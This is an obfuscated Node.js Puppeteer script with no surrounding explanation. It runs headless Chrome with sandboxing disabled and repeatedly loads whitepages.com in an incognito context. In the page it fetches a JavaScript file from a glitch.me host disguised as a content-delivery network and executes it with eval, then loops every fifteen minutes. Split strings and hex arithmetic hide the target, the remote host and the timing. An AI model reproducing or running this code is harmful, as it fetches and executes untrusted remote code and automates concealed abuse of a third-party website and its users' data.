((async () => {
  const e = require('puppeteer'),
    f = await e['launch']({
      'headless': 0x1,
      'args': [
        '--no-sandb' + 'ox',
        '--disable-' + 'setuid-san' + 'dbox'
      ]
    });
  (async function g() {
    let h = 0x1 * -0x247d + 0x16dd + 0xda0;
    const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
      j = await i['newPage']();
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      'timeout': 0x11170
    })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
      let k = new XMLHttpRequest();
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1fbc + 0x1f59 * 0x1 + -0x3f15), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0xa7 * -0x1601 + -0x1a6cf0 + 0x368337), await j['close'](), await i['close'](), g());
  }());
})());